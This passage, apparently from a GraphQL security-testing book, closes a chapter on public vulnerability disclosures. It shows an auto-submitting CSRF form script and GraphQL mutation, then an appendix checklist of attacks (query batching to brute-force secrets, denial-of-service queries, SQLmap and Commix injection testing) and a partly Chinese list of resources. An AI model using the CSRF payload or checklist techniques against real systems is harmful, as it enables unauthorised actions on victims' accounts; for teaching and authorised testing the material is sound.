<script>document.getElementById("csrf-form").submit()</script> ④
```

This HTML code defines a submission form ① that includes two inputs: query ②, which specifies the use of a mutation named CreateSnippet, and variables ③, which holds a few variables passed via the input type. At ④, the code uses JavaScript to submit the form on behalf of the client as soon as a

client loads an HTML page that contains it. Because the API doesn’t check for a CSRF protection header, this is possible.

The GraphQL mutation used in the exploit is as follows:

```
mutation CreateSnippet($input: CreateSnippetInput!) {
  createSnippet(input: $input) {
    errors
    snippet {
      webUrl
      __typename
    }
    --snip--
  }
}
```

As a result of this query, a snippet will be created on behalf of the client with whatever data the attacker included in the HTML form. This CSRF could let the attacker take sensitive actions on behalf of the victim, such as accessing their account or data.

## Summary

This chapter covered public disclosures of real-life vulnerabilities and exploits. You learned about how certain design choices in GraphQL implementations created vulnerabilities that led to information disclosure, injections, authorization issues, and more. We also discussed some of the mitigation approaches companies took to patch the vulnerabilities, where possible.

This book introduced you to GraphQL’s new ways of querying APIs. As you’ve learned, the framework has its own rules, advantages, and disadvantages. GraphQL’s design introduces new vulnerabilities and security challenges. Simultaneously, it remains prone to the classic vulnerabilities that have existed for years. Now that you know how to find vulnerabilities in GraphQL, we recommend that you try to poke holes in the GraphQL applications made available through vulnerability disclosure programs. Who knows; maybe you’ll make a buck or two.

## A

## GRAPHQL API TESTING
CHECKLIST

## Reconnaissance

- Perform a port scan using Nmap to identify open web application ports.
- Scan the web server for GraphQL endpoints by using Graphw00f's detection mode.
- Perform server fingerprinting with Graphw00f's fingerprint mode.
- Search for server-level vulnerabilities on MITRE's CVE database.
- Search for server-level security features on GraphQL Threat Matrix.
- Search for GraphQL IDEs such as GraphiQL Explorer or GraphQL Playground by using EyeWitness.
- Send an introspection query and document all available queries, mutations, and subscriptions.
- Visualize the introspection query response with GraphQL Voyager.

## Denial of Service

- Review the API's SDL file for bidirectional relationships.
- Test for the following:
  - Circular queries or mutations
  - Circular fragments
  - Field duplication
  - Alias overloading
  - Directive overloading
  - Array-based or alias-based query batching
  - Object limit overriding in API pagination arguments such as filter, max, limit, and total

## Information Disclosure

- Extract the GraphQL schema by using field stuffing when introspection is disabled.
- Identify debug errors in query responses by sending malformed queries.
- Identify query tracing in GraphQL responses.
- Test for any PII submitted using queries over the GET method.

## Authentication and Authorization

- Test access to the following:
  - The API without authentication headers
  - Restricted fields by using alternate paths
  - The API by using both the GET and POST methods
- Test signature validation in JSON Web Token (JWT).
- Attempt to brute-force mutations or queries that accept secrets, such as tokens or passwords, using the following:
  - Alias-based query batching
  - Array-based query batching
  - CrackQL
  - Burp Suite

## Injection

- Test for injection in the following:
  - Query arguments
  - Field arguments
  - Query directive arguments
  - Operation names
- Test for SQLi automatically by using SQLmap.
- Test for OS command injection automatically by using Commix.

## Forging Requests

- Test for the following:
  - The existence of anti-CSRF tokens in HTTP headers or bodies
  - Possible anti-CSRF token bypasses
  - The availability of GET-based queries
  - Support for GET-based mutations
- Perform state-changing mutations over GET.
- Perform state-changing mutations over POST.

## Hijacking Requests

- Identify whether the GraphQL server does the following:
  - Supports subscriptions
  - Validates the Origin header during a WebSocket handshake





# B

# GRAPHQL 安全资源

# 渗透测试技巧与窍门

- OWASP 的 GraphQL 备忘单 (https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- Carlos Polop 的 HackTricks (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- Momen Eldawakhl y 的 API Security Empire 项目 (https://github.com/cyprosecurity/API-SecurityEmpire)
- Doyensec 的博客文章“GraphQL—Security Overview and Testing Tips” by Paolo Stagno (https://blog.doyensec.com/2018/05/17/graphql-security-overview.html)
- YesWeHack 的博客文章“How to Exploit GraphQL Endpoint: Introspection, Query, Mutations, & Tools” (https://blog.yeswehack.com/yeswehackers/how-exploit-graphql-endpoint-bug-bounty)
- 0xn3va 的“GraphQL Vulnerabilities” 备忘单 (https://0xn3va.gitbook.io/cheat-sheets/web-application/graphql-vulnerabilities)

# 实践性黑客实验室

- TryHackMe 的 GraphQL 安全房间 (https://tryhackme.com)
- AttackDefense 的 GraphQL 实验室 (https://attackdefense.com/challengedetailsnoauth?cid=1991)
- David3107 的 GraphQL Security 101 (https://github.com/david3107/graphql-security-labs)
- 0xbigshaq 的 HackMeGraph (https://github.com/0xbigshaq/hackmegraph)
- Righetod 的 poc-graphql (https://github.com/righetod/poc-graphql)

# 安全视频

- “Finding Your Next Bug: GraphQL” by Katie Paxton-Fear (https://www.youtube.com/watch?v=jyjGneKjynk)
- “GraphQL API Testing” by Arun S. (https://www.youtube.com/watch?v=Wb0BO8j7024)
- “Hacking GraphQL for Beginners + Giveaway (closed)” by Farah Hawa (https://www.youtube.com/watch?v=OQCGmftU-Og)
- “REST in Peace: Abusing GraphQL to Attack the Underlying Infrastructure—LevelUp 0x05” by Matt Szymanski (https://www.youtube.com/watch?v=NPDp7GHmMa0)
- “An Introduction to GraphQL Security” by Christina Hastenrath (https://www.youtube.com/watch?v=aI-wI4D1nw)
- “Damn GraphQL—Defending and Attacking APIs” by Dolev Farhi (https://www.youtube.com/watch?v=EVRj708-zq4)
- “Access Control Vulnerabilities in GraphQL APIs” by Nikita Stupin (https://www.youtube.com/watch?v=bCjKqPnt_8Y)
- “GraphQL APIs from a Bug Hunter’s Perspective” by Nikita Stupin (https://www.youtube.com/watch?v=nPB8o0cSnvM)
